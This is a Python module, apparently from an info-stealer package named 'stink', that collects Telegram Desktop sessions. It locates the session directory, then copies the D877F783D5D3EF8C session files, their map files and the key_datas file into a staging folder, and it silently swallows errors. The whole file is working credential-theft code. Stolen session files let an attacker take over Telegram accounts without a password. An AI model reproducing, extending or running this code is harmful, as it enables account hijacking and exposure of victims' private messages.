from re import findall
from shutil import copyfile
from os import listdir, path, makedirs

from stink.helpers.config import TelegramConfig


class Telegram:
    """
    Collects sessions from the Telegram.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__full_path = path.join(storage_path, folder)
        self.__config = TelegramConfig()

    def __create_folder(self) -> None:
        """
        Creates storage for the Telegram module.
        :return: None
        """
        folder = path.join(self.__full_path, "D877F783D5D3EF8C")

        if not path.exists(folder):
            makedirs(folder)

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.
        :return: None
        """
        if not path.exists(self.__config.SessionsPath):
            return

        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.__config.SessionsPath)], [])

        if not sessions:
            return

        self.__create_folder()

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            copyfile(path.join(self.__config.SessionsPath, session), path.join(self.__full_path, session))

        maps = sum([findall(r"map.*", file) for file in listdir(path.join(self.__config.SessionsPath, "D877F783D5D3EF8C"))], [])

        for map in maps:
            copyfile(
                path.join(self.__config.SessionsPath, "D877F783D5D3EF8C", map),
                path.join(self.__full_path, "D877F783D5D3EF8C", map)
            )

        copyfile(path.join(self.__config.SessionsPath, "key_datas"), path.join(self.__full_path, "key_datas"))

    def run(self) -> None:
        """
        Launches the Telegram collection module.
        :return: None
        """
        try:

            self.__get_sessions()

        except Exception as e:
            print(f"[Telegram]: {repr(e)}")
